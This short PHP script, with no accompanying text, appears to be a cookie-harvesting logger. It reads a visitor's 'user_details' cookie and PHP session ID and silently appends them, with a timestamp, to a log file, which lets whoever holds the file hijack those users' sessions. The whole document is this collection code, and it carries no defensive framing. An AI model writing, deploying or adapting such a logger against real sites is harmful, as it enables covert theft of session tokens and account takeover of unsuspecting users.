<?php

if(isset($_COOKIE)) {
$cookie = $_COOKIE['user_details'];
$SessionID=$_COOKIE['PHPSESSID'];
}
else {
$cookie = 'There are no Cookies, you must bake some.';
echo $cookie ;
}

$date = date("I ds of F Y h:i:s A");
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$file = fopen("log.txt", "a");
//fwrite($file, "DATE : $date || USER AGENT : $user_agent || COOKIE : $cookie \n");
fwrite($file, "DATE : $date || COOKIE-UserDetails : $cookie || Session ID : $SessionID \n");
fclose($file);

?>